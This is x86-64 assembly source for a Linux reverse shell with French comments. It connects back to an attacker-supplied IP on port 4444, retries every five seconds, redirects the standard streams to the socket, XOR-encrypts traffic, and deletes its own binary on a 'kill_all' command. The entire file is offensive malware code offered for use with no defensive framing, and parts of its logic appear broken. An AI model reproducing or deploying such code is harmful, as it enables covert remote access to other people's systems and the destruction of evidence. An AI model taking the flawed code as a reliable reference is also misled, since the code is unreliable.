section .data
    command      db '/bin/bash',0
    port_str     db '4444',0
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    ; Messages et commandes spéciales
    kill_cmd     db 'kill_all',0
    rm_cmd       db '/bin/rm',0
    rm_arg1      db '-f',0
    self_path    db '/proc/self/exe',0
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0
    timespec     dq 5, 0          ; 5 secondes entre les tentatives

    ; Clé de chiffrement (XOR simple)
    xor_key      db 0x2A, 0x3F, 0x15, 0x1D, 0x0B, 0x7C, 0x55, 0x39
    key_len      equ $ - xor_key

    ; Arguments pour rm
    rm_args     dq rm_cmd, rm_arg1, 0

section .bss
    ip_bytes    resd 1  ; IP en format réseau
    port_bytes  resw 1  ; Port en format réseau
    buffer      resb 1024
    self_exe    resb 256

section .text
    global _start

;----------------------------------------------------------
; Validation et conversion de l'IP
; Entrée : rdi = pointeur vers la chaîne IP
; Sortie : rax = 1 (succès), 0 (erreur)
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rsi, rdi
    xor rbx, rbx
    xor r12d, r12d
    xor eax, eax

parse_ip_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz end_parse
    
    cmp dl, '.'
    je store_octet
    
    cmp dl, '0'
    jb invalid_ip
    cmp dl, '9'
    ja invalid_ip
    
    sub dl, '0'
    imul eax, 10
    add eax, edx
    cmp eax, 255
    ja invalid_ip
    
    inc rsi
    jmp parse_ip_loop

store_octet:
    cmp bl, 3
    jae invalid_ip
    
    shl r12d, 8
    or r12d, eax
    inc bl
    xor eax, eax
    inc rsi
    jmp parse_ip_loop

end_parse:
    cmp bl, 3
    jne invalid_ip
    
    shl r12d, 8
    or r12d, eax
    bswap r12d
    mov [ip_bytes], r12d
    mov rax, 1
    jmp done_ip

invalid_ip:
    xor rax, rax

done_ip:
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Validation et conversion du port (fixé à 4444)
;----------------------------------------------------------
validate_port:
    mov rsi, port_str
    xor rax, rax
    xor rcx, rcx

convert_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz check_value
    
    cmp dl, '0'
    jb invalid_port
    cmp dl, '9'
    ja invalid_port
    
    sub dl, '0'
    imul rax, 10
    add rax, rdx
    cmp rax, 65535
    ja invalid_port
    
    inc rsi
    inc rcx
    jmp convert_loop

check_value:
    test rcx, rcx
    jz invalid_port
    
    xchg al, ah
    mov [port_bytes], ax
    mov rax, 1
    ret

invalid_port:
    xor rax, rax
    ret

;----------------------------------------------------------
; Chiffrement/déchiffrement XOR
; Entrée : rdi = données, rsi = longueur
;----------------------------------------------------------
xor_crypt:
    push rdi
    push rsi
    push rcx
    push rdx
    push r8
    push r9

    mov r8, rdi        ; buffer
    mov r9, rsi        ; length
    xor rcx, rcx       ; index
    xor rdx, rdx       ; key index

crypt_loop:
    cmp rcx, r9
    jge crypt_done
    
    ; Charger l'octet à chiffrer
    mov al, [r8 + rcx]
    
    ; Charger l'octet de clé
    mov bl, [xor_key + rdx]
    
    ; XOR
    xor al, bl
    
    ; Stocker le résultat
    mov [r8 + rcx], al
    
    ; Incrémenter les index
    inc rcx
    inc rdx
    cmp rdx, key_len
    jb next_crypt
    xor rdx, rdx       ; Réinitialiser l'index de clé

next_crypt:
    jmp crypt_loop

crypt_done:
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rsi
    pop rdi
    ret

;----------------------------------------------------------
; Auto-destruction
;----------------------------------------------------------
self_destruct:
    ; Lire le chemin de l'exécutable
    mov rax, 89        ; sys_readlink
    lea rdi, [self_path]
    lea rsi, [self_exe]
    mov rdx, 256
    syscall
    
    test rax, rax
    js exit_program
    
    ; Ajouter le NULL terminal
    lea rdi, [self_exe]
    add rdi, rax
    mov byte [rdi], 0
    
    ; Ajouter le chemin à supprimer aux arguments
    lea rsi, [rm_args + 16]  ; Position après les 2 premiers arguments
    mov [rsi], rdi
    
    ; Supprimer l'exécutable
    mov rax, 59        ; sys_execve
    lea rdi, [rm_cmd]
    lea rsi, [rm_args]
    xor rdx, rdx
    syscall

;----------------------------------------------------------
; Comparaison de chaînes
; Entrée : rdi = str1, rsi = str2
; Sortie : rax = 0 si égales
;----------------------------------------------------------
strcmp:
    xor rcx, rcx

compare_loop:
    mov al, [rdi + rcx]
    mov bl, [rsi + rcx]
    cmp al, bl
    jne not_equal
    test al, al
    jz equal
    inc rcx
    jmp compare_loop

equal:
    xor rax, rax
    ret

not_equal:
    mov rax, 1
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    ; Récupération des arguments
    pop rcx
    pop rsi
    
    ; Vérifier nombre d'arguments
    cmp rcx, 2
    jne usage_error
    
    ; Récupérer l'adresse IP
    pop rdi
    call validate_and_parse_ip
    test rax, rax
    jz ip_error
    
    ; Valider le port
    call validate_port
    test rax, rax
    jz port_error

connection_loop:
    ; Création du socket
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    
    test rax, rax
    js socket_error
    mov r8, rax         ; Sauvegarder le socket

    ; Préparation de la structure d'adresse
    sub rsp, 16
    mov word [rsp], 2
    mov ax, [port_bytes]
    mov word [rsp+2], ax
    mov eax, [ip_bytes]
    mov dword [rsp+4], eax
    mov qword [rsp+8], 0

    ; Connexion
    mov rax, 42
    mov rdi, r8
    mov rsi, rsp
    mov rdx, 16
    syscall
    
    add rsp, 16
    test rax, rax
    js connect_error

    ; Redirection des flux standard
    xor rsi, rsi
dup_loop:
    mov rax, 33
    mov rdi, r8
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop

    ; Boucle de surveillance des commandes
surveillance_loop:
    ; Lire les données du socket
    mov rax, 0          ; sys_read
    mov rdi, r8
    lea rsi, [buffer]
    mov rdx, 1024
    syscall

    test rax, rax
    jz exit_program     ; Connexion fermée
    js exit_program     ; Erreur

    ; Déchiffrer les données
    mov rdi, rsi        ; buffer
    mov rsi, rax        ; longueur
    call xor_crypt

    ; Vérifier la commande kill_all
    lea rdi, [buffer]
    lea rsi, [kill_cmd]
    call strcmp
    test rax, rax
    jz destruct

    ; Réchiffrer et renvoyer les données
    mov rdi, buffer
    mov rsi, rax
    call xor_crypt

    ; Écrire les données déchiffrées
    mov rdx, rax        ; longueur
    mov rax, 1          ; sys_write
    mov rdi, r8
    lea rsi, [buffer]
    syscall

    ; Continuer
    jmp surveillance_loop

destruct:
    call self_destruct

    ; Fermer la connexion
    mov rax, 3          ; sys_close
    mov rdi, r8
    syscall
    jmp exit_program

usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    mov rdi, 1
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    mov rdi, 1
    jmp exit_program

port_error:
    mov rdi, 1
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    mov rdi, 1
    jmp exit_program

connect_error:
    mov rax, 3          ; sys_close
    mov rdi, r8
    syscall
    
    ; Attendre avant de réessayer
    mov rax, 35
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    
    jmp connection_loop

exit_program:
    mov rax, 60
    syscall